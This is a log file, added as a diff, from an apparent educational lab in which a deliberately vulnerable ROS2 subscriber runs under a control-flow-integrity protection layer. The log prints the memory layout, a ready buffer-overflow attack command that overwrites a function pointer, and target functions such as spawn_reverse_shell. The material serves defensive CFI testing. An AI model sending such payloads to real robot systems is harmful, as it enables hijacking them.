@@ -1,0 +1,46 @@
+[CFI] === ROS2 CFI Day 6 (Final Version) ===
+[CFI] PID: 4575
+[CFI] Process: vulnerable_subs
+[CFI] Strict mode ENABLED
+[0;32m[CFI-SUCCESS] CFI initialized successfully![0m
+[CFI] Waiting for ROS2 callbacks...
+취약한 Subscriber 노드를 시작합니다...
+경고: 이 프로그램은 교육 목적으로만 사용되어야 합니다!
+[WARN] [1748585804.301991779] [vulnerable_subscriber]: 경고: 이 노드는 의도적인 취약점을 포함합니다!
+[WARN] [1748585804.302057051] [vulnerable_subscriber]: 교육 목적으로만 사용하세요.
+
+=== 취약한 노드 메모리 레이아웃 ===
+VulnerableSubscriber 객체 주소: 0x60f56a05ee60
+vulnerable_buffer 주소: 0x60f56a05f1e0
+function_pointer 주소: 0x60f56a05f200
+subscription 주소: 0x60f56a05f210
+버퍼에서 함수 포인터까지 거리: 32 bytes
+합법적인 함수 주소: 0x60f548c1f600
+악성 함수 주소: 0x60f548c1f828
+
+노드가 준비되었습니다. 다음 명령어로 메시지를 보내보세요:
+정상 메시지: ros2 topic pub /vulnerable_topic std_msgs/msg/String "data: 'Hello'"
+공격 메시지: ros2 topic pub /vulnerable_topic std_msgs/msg/String "data: 'HEX:414141414141414141414141414141414141414141414141414141414141414128f8c148f56000000000000000000000'"
+
+=== 공격 가능한 함수 주소들 ===
+execute_calculator 주소: 0x60f548c1fd6a
+leak_system_info 주소: 0x60f548c1ffda
+spawn_reverse_shell 주소: 0x60f548c20294
+create_pwned_file 주소: 0x60f548c20338
+malicious_function 주소: 0x60f548c1f828
+[0;32m[CFI-SUCCESS] === CFI Protection Active! First callback intercepted ===[0m
+[0;32m[CFI-SUCCESS] Registered new subscription 0x7d2fdb296830 (hash: 0x135ebe62ad505ef8)[0m
+[0;32m[CFI-SUCCESS] Registered new subscription 0x60f548ce2560 (hash: 0xde0641f4c3b1f73c)[0m
+
+=== 콜백 호출됨 ===
+받은 메시지 길이: 20 bytes
+메시지 내용: AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA
+overflow 이전 함수 포인터: 0x60f548c1f600
+overflow 이후 함수 포인터: 0x60f548c1f600
+버퍼 내용 (16진수):
+
+0A 0A 0A 0A 0A 0A 0A 0A 0A 0A 0A 0A 0A 0A 0A 0A 
+0A 0A 0A 0A 0A 0A 0A 0A 0A 0A 0A 0A 0A 0A 0A 0A 
+함수 포인터 호출 시도...
+✓ 합법적인 함수가 호출되었습니다. 시스템이 정상 작동 중입니다.
+[INFO] [1748585807.111762052] [vulnerable_subscriber]: 정상적인 처리가 완료되었습니다.
